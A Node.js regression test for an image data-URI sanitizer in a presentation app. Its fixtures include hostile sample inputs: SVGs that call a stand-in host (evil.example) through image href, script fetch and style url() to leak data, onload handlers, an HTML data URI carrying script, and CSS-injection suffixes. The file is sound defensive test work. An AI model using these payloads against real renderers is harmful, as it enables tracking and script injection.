/**
 * Inline data: image sanitization regression test (CI-gated).
 *
 * Covers sanitizeImageDataUri (v12.63), used for the image-block src, slide
 * background image, and branding logo. The risk: a data:image/svg+xml URI is
 * LIVE SVG reaching an <img src> without the sanitizer the svg block applies,
 * so a deck SVG's external <image>/<style url()>/<script> could fire outside a
 * sandboxing browser. This loads the REAL functions from part-imports.jsx and
 * asserts: raster types pass through, SVG data: URIs are routed through
 * sanitizeSvgMarkup (external refs / script / handlers stripped), and non-image
 * data: types are dropped.
 *
 * Usage: node tests/test_data_image_uri.cjs  (exit 0 = pass, 1 = fail)
 */
const fs = require("fs");
const path = require("path");
const vm = require("vm");

let JSDOM;
try { JSDOM = require("jsdom").JSDOM; }
catch (e) {
  try { JSDOM = require("/tmp/node_modules/jsdom").JSDOM; }
  catch (_) { console.error("jsdom not installed. CI installs it; locally run: npm i jsdom"); process.exit(2); }
}

const REPO = path.resolve(__dirname, "..");
const SRC = path.join(REPO, "src/parts/part-imports.jsx");
const source = fs.readFileSync(SRC, "utf8");

const grabs = {
  allowed:  source.match(/const SVG_ALLOWED_TAGS = new Set\(\[[\s\S]*?\]\);/),
  refAttrs: source.match(/const SVG_URL_REF_ATTRS = new Set\(\[[\s\S]*?\]\);/),
  isSafe:   source.match(/function isSvgStyleSafe\(css\) \{[\s\S]*?\n\}/),
  svg:      source.match(/function sanitizeSvgMarkup\(raw\) \{[\s\S]*?\n\}/),
  raster:   source.match(/const SAFE_RASTER_DATA_IMAGE = \/.*?\/i;/),
  dataUri:  source.match(/function sanitizeImageDataUri\(s\) \{[\s\S]*?\n\}/),
};
for (const [k, v] of Object.entries(grabs)) {
  if (!v) { console.error(`FAIL: could not locate '${k}' in source. Check regexes.`); process.exit(2); }
}

const dom = new JSDOM("<!DOCTYPE html><html><body></body></html>");
const sandbox = {
  DOMParser: dom.window.DOMParser,
  document: dom.window.document,
  window: dom.window,
  console,
  atob: (b) => Buffer.from(b, "base64").toString("binary"),
  module: { exports: {} },
};
vm.createContext(sandbox);
vm.runInContext(`
${grabs.allowed[0]}
${grabs.refAttrs[0]}
${grabs.isSafe[0]}
${grabs.svg[0]}
${grabs.raster[0]}
${grabs.dataUri[0]}
module.exports = { sanitizeImageDataUri };
`, sandbox);
const { sanitizeImageDataUri } = sandbox.module.exports;

let passed = 0, failed = 0;
function check(name, cond) {
  if (cond) { passed++; }
  else { failed++; console.error(`  ✗ ${name}`); }
}
// decode the svg payload back to markup for inspection
function decoded(uri) {
  const pre = "data:image/svg+xml,";
  if (typeof uri !== "string" || !uri.startsWith(pre)) return "";
  try { return decodeURIComponent(uri.slice(pre.length)); } catch (_) { return ""; }
}

const PNG = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==";

// raster passthrough
check("raster png passes through unchanged", sanitizeImageDataUri(PNG) === PNG);
check("raster jpeg passes through", sanitizeImageDataUri("data:image/jpeg;base64,/9j/xx").startsWith("data:image/jpeg"));

// non-image data: types dropped
check("data:text/html dropped", sanitizeImageDataUri("data:text/html,<script>alert(1)</script>") === "");
check("data:application/javascript dropped", sanitizeImageDataUri("data:application/javascript,alert(1)") === "");
check("non-data string dropped", sanitizeImageDataUri("https://evil/x.png") === "");
check("empty dropped", sanitizeImageDataUri("") === "");

// svg data: URI routed through sanitizeSvgMarkup
const extImg = "data:image/svg+xml," + encodeURIComponent(
  "<svg xmlns='http://www.w3.org/2000/svg'><image href='https://evil.example/track.gif?d=stolen'/></svg>");
const r1 = sanitizeImageDataUri(extImg);
check("svg external <image href> -> still a data:image/svg+xml", r1.startsWith("data:image/svg+xml,"));
check("svg external <image href> -> external host stripped", r1 !== "" && !decoded(r1).includes("evil.example"));

const scriptSvg = "data:image/svg+xml," + encodeURIComponent(
  "<svg xmlns='http://www.w3.org/2000/svg'><script>fetch('https://evil.example')</script><rect width='1' height='1'/></svg>");
const r2 = sanitizeImageDataUri(scriptSvg);
check("svg <script> stripped", r2 !== "" && !decoded(r2).toLowerCase().includes("<script"));

const onloadSvg = "data:image/svg+xml," + encodeURIComponent(
  "<svg xmlns='http://www.w3.org/2000/svg' onload='fetch(1)'><rect onload='x()' width='1' height='1'/></svg>");
const r3 = sanitizeImageDataUri(onloadSvg);
check("svg event handlers stripped", r3 !== "" && !decoded(r3).toLowerCase().includes("onload"));

const styleSvg = "data:image/svg+xml," + encodeURIComponent(
  "<svg xmlns='http://www.w3.org/2000/svg'><style>rect{fill:url('https://evil.example/x')}</style><rect width='1' height='1'/></svg>");
const r4 = sanitizeImageDataUri(styleSvg);
check("svg <style> external url() stripped", !decoded(r4).includes("evil.example"));

// base64-encoded svg path also sanitized
const b64 = "data:image/svg+xml;base64," + Buffer.from(
  "<svg xmlns='http://www.w3.org/2000/svg'><image href='https://evil.example/x'/></svg>").toString("base64");
const r5 = sanitizeImageDataUri(b64);
check("base64 svg external ref stripped", r5 !== "" && !decoded(r5).includes("evil.example"));

// benign svg survives
const benign = "data:image/svg+xml," + encodeURIComponent(
  "<svg xmlns='http://www.w3.org/2000/svg'><rect x='1' y='1' width='8' height='8' fill='#3b82f6'/></svg>");
const r6 = sanitizeImageDataUri(benign);
check("benign svg survives", r6.startsWith("data:image/svg+xml,") && decoded(r6).includes("rect"));

// v12.65: raster branch is END-ANCHORED. A value with a valid raster prefix but
// trailing bytes (previously returned verbatim, then broke out of an unquoted CSS
// url() at a background sink) must now be dropped; clean base64 still passes.
check("raster prefix + trailing suffix dropped", sanitizeImageDataUri(PNG + ") , url(https://evil.example/x)") === "");
check("raster prefix + style-injection suffix dropped", sanitizeImageDataUri(PNG + ";background:url(https://evil.example)") === "");
check("raster prefix + 2nd-layer suffix (gif) dropped", sanitizeImageDataUri("data:image/gif;base64,R0lGODlhAQABAAAAACw=) , url(https://evil.example)") === "");
check("non-base64 bare-comma raster form dropped", sanitizeImageDataUri("data:image/png,whatever") === "");
check("clean raster still passes unchanged (end-anchored)", sanitizeImageDataUri(PNG) === PNG);

console.log(`  ${passed} passed, ${failed} failed`);
process.exit(failed === 0 ? 0 : 1);
